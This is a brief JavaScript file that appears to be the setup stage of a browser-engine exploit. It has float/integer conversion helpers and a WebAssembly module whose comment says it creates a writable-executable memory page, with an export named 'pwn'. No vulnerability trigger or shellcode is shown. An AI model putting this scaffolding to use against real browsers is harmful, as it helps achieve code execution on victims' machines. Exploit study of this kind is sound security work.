var i64 = new BigInt64Array(1);
var f64 = new Float64Array(i64.buffer);

// helper function
function ftoi(x) {
  f64[0] = x;
  return i64[0];
}

function itof(x) {
  i64[0] = x;
  return f64[0];
}

function hex(i) {
  return "0x" + i.toString(16);
}


// create rwx page
let bytes = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,144,128,128,128,0,2,6,109,101,109,111,114,121,2,0,3,112,119,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
let mod = new WebAssembly.Module(bytes);
let instance = new WebAssembly.Instance(mod);
let pwn = instance.exports.pwn;
pwn();